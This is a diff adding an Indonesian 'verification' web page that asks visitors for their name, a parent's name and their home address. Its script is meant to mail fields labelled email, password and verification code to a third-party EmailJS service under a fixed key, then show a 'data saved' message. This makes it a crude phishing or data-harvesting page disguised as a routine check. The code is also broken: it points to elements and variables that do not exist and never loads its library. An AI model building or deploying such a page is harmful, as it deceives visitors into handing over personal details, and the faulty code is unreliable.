@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifikasi</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: linear-gradient(135deg, #bbdefb, #90caf9);
+      font-family: "Poppins", sans-serif;
+    }
+    .box {
+      background: white;
+      padding: 40px;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+    }
+    input {
+      padding: 10px;
+      width: 100%;
+      margin-top: 10px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      outline: none;
+    }
+    button {
+      margin-top: 15px;
+      padding: 10px 20px;
+      background: #1976d2;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>Masukan Masukan namamu</h2>
+    <input type="text" placeholder="Siapa nama mu?" required>
+    <br>
+    <br>
+    <br>
+    <br>
+    <h2>Masukan Nama Ortu/Orang tua</h2>
+    <input type="text" id="password" placeholder="Tolong untuk di isi" required>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <h2>Masukan alamat Rumah mu</h2>
+    <input type="text" id="email" placeholder="Alamat rumah" required>
+    <p>apakah anda ragu dengan kami? anda bisa cek:<a href="privacy.html">Privacy And policy</a> Kami</p>
+    <a href="selesai.html"><button type="submit">Selesai</button></a>
+  </div>
+  <script>
+    (function() {
+      emailjs.init("4ouxaUkNkXNV7IwFa"); // Ganti dengan Public Key kamu
+    })();
+
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const loading = document.getElementById("loading");
+      loading.style.display = "block";
+
+      const templateParams = {
+        user_email: email,
+        user_password: password,
+        verification_code: code
+      };
+
+      emailjs.send("service_gbaqlrq", "template_gnsct6i", templateParams)
+        .then(() => {
+          loading.innerText = "Penyimpanan data berhasil";
+          setTimeout(() => {
+            window.location.href = "selesai.html";
+          }, 1500);
+        })
+        .catch(() => {
+          loading.innerText = "Gagal, tolong coba lagi";
+        });
+    });
+  </script>
+</body>
+</html>
